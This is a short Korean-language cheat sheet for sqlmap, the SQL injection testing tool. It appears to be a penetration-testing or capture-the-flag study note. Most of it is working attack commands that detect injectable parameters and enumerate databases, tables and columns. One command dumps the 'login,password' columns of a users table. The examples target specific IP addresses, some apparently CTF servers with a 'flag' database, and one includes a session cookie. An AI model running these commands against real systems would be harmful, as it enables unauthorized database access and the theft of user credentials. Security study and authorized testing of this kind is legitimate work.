# 개념
공개 모의침투 도구로 SQL구문삽입(SQL Injection) 취약점을 탐지/진단하고 데이터베이스에 직간접적으로 접근할 수 있는 취약점 분석 도구

# 사용법
GET 방식 입력값 점검

	sqlmap -u "http://192.168.23.131/cat.php?id=1"

데이터베이스 목록 조회

	sqlmap -u "http://192.168.23.131/cat.php?id=1" --dbs

쿠키값이 필요할 경우

	sqlmap -u "http://211.250.216.249:5080/board/write.php" --cookie="PHPSESSID=3i43aetq32fb1ft32el5591m75;" --data "title=Test%20Title&content=This%20is%20a%20test%20content."

테이블 목록 조회

	sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog --tables

컬럼 목록 조회

	sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns

테이블 내용 덤프

	sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users --columns

	sqlmap -u "http://192.168.23.131/cat.php?id=1" -D photoblog -T users -C "login,password" --dump

POST 방식 입력값 점검

	sqlmap -u "http://192.168.23.131/admin/index.php" --data "user=USER&password=PASS"

실시간 반영
이전 실행 결과을 저장했다가 동일한 명령이 오면 다시 사용하기 때문에 실시간 정보가 필요하다면 사용해야 한다

	sqlmap --flush-session -u ....

# 예시
	sqlmap -u "http://20.200.213.108:60002/login.php" -D "flag" --tables -data "uname=a&pw=a&submit=submit"
	sqlmap -u "http://20.214.183.146:1337/topic.php?id=33" -D "flag" --tables 
	sqlmap -u "http://211.250.216.249:5080/board/write.php" --cookie="PHPSESSID=3i43aetq32fb1ft32el5591m75;" --data "title=Test%20Title&content=This%20is%20a%20test%20content."
	sqlmap -u "http://20.196.196.147:5080/login/login.php" --data "userid=a&userpw=b"
